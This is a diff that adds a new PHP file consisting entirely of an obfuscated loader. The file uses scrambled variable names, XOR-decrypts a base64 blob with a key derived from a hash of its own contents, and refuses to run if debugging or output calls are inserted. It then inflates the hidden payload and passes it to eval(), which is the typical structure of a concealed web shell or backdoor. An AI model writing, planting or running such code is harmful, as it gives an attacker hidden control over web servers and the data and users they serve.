@@ -1,0 +1,24 @@
+<?php
+$qhwxjx="6ca566518692faa2f55aca5b1f08f5f1";
+$nndqcmq="5352500d055554045a575f015f505457540406565a5150530852080c02010355";
+$ephaameqho="uGfuV+BTccs17zapb+GAuDZ5XoSzd6EysWO8FlNCdm9Cv12Pn0OfQqxetFYNKO4lskl7pP/HON+Hj8NY2rF0Tw5CKTWrMTO4pWo+bPubjd1unCDnf5Xv5LtQVCAb+QGRSE83u8TMM0lW3QSmQDdcX7hElS+SxPwT7BNm0QPzgHDUNpdq8O4BxBrtqGRqRTtO+MbLXPF2VdENvSjmfDNKzT69ESt3iEXvEXynVHd8pCHB6N9+XdF+eDbCltgr5Unb/XQfxJ2zjQiUEP7RP1tLfp4TFty/7eMDs1tCVPx2WsrzjQPCzby6RkMpqC25Bed1o0fSkLfsEGzthK2+9ZjltYWL8dATtCEBbhf8GmdcUA0Tkqn94F/rv/IrWj/tCyf2pbFNCgifd/Hg+n4lKfa9EKeUPi1uFrmB64p9c8NKs0ot6z6Kkmypq3rDOGCB0Pfah3/lB2IGM94xpq6AVKNVp0WSbamJg7jhlYjSZUv6MP5MDClJAsupB0ywscC9ZtNBXlCN5eGmr/5+1awPdtw99Tut87RZeYEbgbTLbRmB4eaUjQH1jF4yswUlKrvZSIDloGIZ7yt6x0NneayDGVooUzdgly4DzM51KaBPD4dR0kr9HqWhHjLgU+IQ8oWx+/XXENm3/PZ2n0nqWBOvNkwyQKT2A496rIYucyC0ew9T+rgptMupiHfwljjUfboxQMXQqf30xxGxHQO2d8PJJgKzCSIf/O8J0dB+2PGsh+pAFNa4w97F3g3/6dgesX3PadwFz6xUKLDsgmqQs+qFrN/qgNmXrKFpULNwEq7stzR7+MLS2shQ8xbLLDM4tzu+6iaLmMt0cHd7tyvadnWGd+/dx4UXMo8rt0qT7I/4SFY+XvGSqvBla6Y53mR3RMCkwkMNFMTg3b5bRgUVfFMnX+hptYkcG4HeQrL5ysH0yLxemhKrfnL2jhhMjlBPIyvf+X3d6MjJYdLZz8fxzWvybQmSjlUVApBDLknwYnorrmLMgINEYbNTvxN0jr7nMH4CPuyDx2tbK9WSt6b0Rgr2kktSpRiaCGXAhW3HfdjIOYoTmW+7/hIItHl+OTB8e1L429j+VGjcARxHY2KiV2MGmgxA2QhHVpapEAQb743GWJJVTKfmul2Re98JfTxMdfbKSiGTIKHK1838lU9zjkblFq0DhN5eQ+wULbow";
+$fotexeau=file_get_contents(__FILE__);
+$xihpnlza=str_replace($ephaameqho,"",$fotexeau);
+if(strpos($xihpnlza,"ec"."ho")!==false||strpos($xihpnlza,"pr"."int")!==false||strpos($xihpnlza,"var_"."dump")!==false||strpos($xihpnlza,"file_put_"."contents")!==false||strpos($xihpnlza,"fw"."rite")!==false){die();}
+$faemvyrhzcch=str_replace(array($qhwxjx,$nndqcmq),array("SP_0b1ef4b0","KP_d7effe14"),$fotexeau);
+$vfbzjusivuhe=md5($faemvyrhzcch);
+$rfsaxa=hex2bin($nndqcmq);
+$vxxxyqseq="";
+$wzkvmeznuste=strlen($vfbzjusivuhe);
+for($muewkenst=0;$muewkenst<$wzkvmeznuste;$muewkenst++){
+    $vxxxyqseq.=chr(ord($rfsaxa[$muewkenst])^ord($vfbzjusivuhe[$muewkenst]));
+}
+$vyfpknx=base64_decode($ephaameqho);
+$jbpbldiqnmq=strlen($vyfpknx);
+$vydnjthzimjj="";
+$hetjkrsfaaj=strlen($vxxxyqseq);
+for($muewkenst=0;$muewkenst<$jbpbldiqnmq;$muewkenst++){
+    $vydnjthzimjj.=$vyfpknx[$muewkenst]^$vxxxyqseq[$muewkenst%$hetjkrsfaaj];
+}
+$svdocspozi="gz"."in"."fl"."ate";
+eval($svdocspozi($vydnjthzimjj));
